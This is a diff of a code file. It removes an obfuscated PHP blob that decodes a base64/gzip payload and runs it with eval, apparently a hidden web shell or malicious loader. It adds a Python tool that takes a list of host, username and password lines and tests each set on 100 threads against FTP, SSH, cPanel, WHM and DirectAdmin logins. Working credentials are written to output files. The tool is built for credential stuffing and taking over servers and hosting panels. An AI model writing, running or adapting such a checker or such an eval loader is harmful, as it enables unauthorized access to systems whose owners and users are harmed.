@@ -1,3 +1,174 @@
-<?php
-$SISTEMIT_COM_ENC = "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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="1s+OlB8xHW8ads3V2OOxDbk4dpLdJPbazmRGcYQEEkjLRUy/YCebH2MhWVoQDzzwhHih/th3LlXV1Vca7IzmixXTdJ8659Q5p86tqv34kZiIMfyfiKGYdavwORJzR4xS6YPHj8SdmMP3cRUuxg24HrTFqAp3hh0x/grw+AjHj1LWC0Ixz/1TzFuEQcwtxPH4UUMMunUc";
-?>
+from __future__ import print_function
+import ftplib
+import paramiko
+import concurrent.futures
+import requests
+from multiprocessing.pool import ThreadPool
+import time
+
+
+
+def check_ftp(line):
+    try:
+        # try to split that line to get host, username, and password
+        try:
+            host, username, password = line.split()
+        except Exception as e:
+            print("Error Format {} , Line Error: {}".format(line, e))
+            return False
+
+        ftp = ftplib.FTP()
+        ftp.connect(host, timeout=10)
+        ftp.login(username, password)
+        ftp.quit()
+        print(f"[ FTP SUCCESS ] {host}|{username}|{password}")
+        with open('output/FTPFound.txt', 'a') as result:
+            result.write(f"{host}|{username}|{password}\n")
+    except Exception as e:
+        print(f"[ FTP FAILED ] {host}|{username}|{password} - {e}")
+
+def check_ssh(line):
+    try:
+        # try to split that line to get host, username, and password
+        try:
+            host, username, password = line.split()
+        except Exception as e:
+            print("Error Format {} , Line Error: {}".format(line, e))
+            return False
+
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            ssh.connect(host, port=22, username=username, password=password, timeout=10)
+            ssh.close()
+            print(f"[+ SSH SUCCESS] {host}|{username}|{password}")
+            with open('output/SSFound.txt', 'a') as result:
+                result.write(f"{host}|{username}|{password}\n")
+        except paramiko.AuthenticationException as auth_error:
+            print(f"[ SSH FAILED ] {host}|{username}|{password} - Authentication Failed")
+        except paramiko.SSHException as ssh_error:
+            if "Error reading SSH protocol banner" in str(ssh_error):
+                print(f"[ SSH FAILED ] {host} Error reading SSH protocol banner")
+            else:
+                print(f"[ SSH FAILED ] {host}|{username}|{password} - {ssh_error}")
+        except Exception as e:
+            print(f"[ SSH FAILED ] {host}|{username}|{password} - An unexpected error occurred")
+
+    except Exception as e:
+        print(f"[SSH FAILED] {host}|{username}|{password} - Failed")
+
+def check_login(line, login_type):
+    try:
+        # try to split that line to get host, username, and password
+        try:
+            host, username, password = line.split()
+        except Exception as e:
+            print("Error Format {} , Line Error: {}".format(line, e))
+            return False
+
+        # add https:// to the beginning of the URL if it's not already there
+        if not host.startswith('https://'):
+            host = 'https://' + host
+
+        if login_type == 'cpanel':
+            host += ':2083/login/?login_only=1'
+        elif login_type == 'whm':
+            host += ':2087/login/?login_only=1'
+        else:
+            print("Invalid login type: {}".format(login_type))
+            return False
+
+        # build post parameters
+        params = {'user': username, 'pass': password}
+
+        # make request
+        r = requests.post(host, params, timeout=10)
+
+        if "status" in r.text and "security_token" in r.text:
+            if login_type == 'cpanel':
+                print("[CPANEL SUCCESS] {}|{}|{}".format(host, username, password))
+                with open('output/CpanelFound.txt', 'a') as result:
+                    result.write(f"{host}|{username}|{password}\n")
+            elif login_type == 'whm':
+                print("[WHM FAILED]  {}|{}|{}".format(host, username, password))
+                with open('output/WHMFound.txt', 'a') as result:
+                    result.write(f"{host}|{username}|{password}\n")
+
+            return True
+
+        else:
+            print("[ {} ] {}|{}|{} - Failed > \"{}\"".format(login_type.upper(), host, username, password, r.reason))
+            return False
+
+    except requests.exceptions.ConnectTimeout as e:
+        print("[ {} Not Found] {}".format(login_type.upper(), host))
+        return False
+
+    except requests.exceptions.RequestException as e:
+        print("[ {} Not Found] {}".format(login_type.upper(), host))
+        return False
+
+def check_directadmin(line):
+    try:
+        # try to split that line to get host, username, and password
+        try:
+            host, username, password = line.split()
+        except Exception as e:
+            print("Error Format {} , Line Error: {}".format(line, e))
+            return False
+
+        # add http:// to the beginning of the URL if it's not already there
+        if not host.startswith('http://'):
+            host = 'https://' + host
+
+        host += ':2222/api/login'
+
+        # build post parameters
+        payload = {'username': username, 'password': password}
+        headers = {'Content-Type': 'application/json'}
+
+        # make request
+        try:
+            r = requests.post(host, json=payload, headers=headers, timeout=10)
+        except requests.exceptions.RequestException as e:
+            print("[ DirectAdmin Not Found ] {}".format(host))
+            return False
+
+        if r.status_code == 200 and 'sessionID' in r.json():
+            print("[DIRECTADMIN SUCCESS] {}|{}|{}".format(host, username, password))
+            with open('output/DirectAdminFound.txt', 'a') as result:
+                result.write(f"{host}|{username}|{password}\n")
+            return True
+        else:
+            print("[DIRECTADMIN FAILED] {}|{}|{} - Failed > \"{}\"".format(host, username, password, r.reason))
+            return False
+
+    except Exception as e:
+        print(f"[DIRECTADMIN FAILED] {host}|{username}|{password} - An unexpected error occurred")
+        return False
+
+
+def main():
+    try:
+        filename = input("Give Me Your List?: ")
+        try:
+            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
+                list_data = [line.strip() for line in f.readlines()]
+        except IOError:
+            print("Failed to read file {}".format(filename))
+            list_data = []
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+            for line in list_data:
+                executor.submit(check_ftp, line)
+                executor.submit(check_ssh, line)
+                executor.submit(check_login, line, 'cpanel')
+                executor.submit(check_login, line, 'whm')
+                executor.submit(check_directadmin, line)
+
+    except Exception as e:
+        error_message = "An error occurred during program execution: {}".format(e)
+        print(error_message)
+
+if __name__ == '__main__':
+    main()
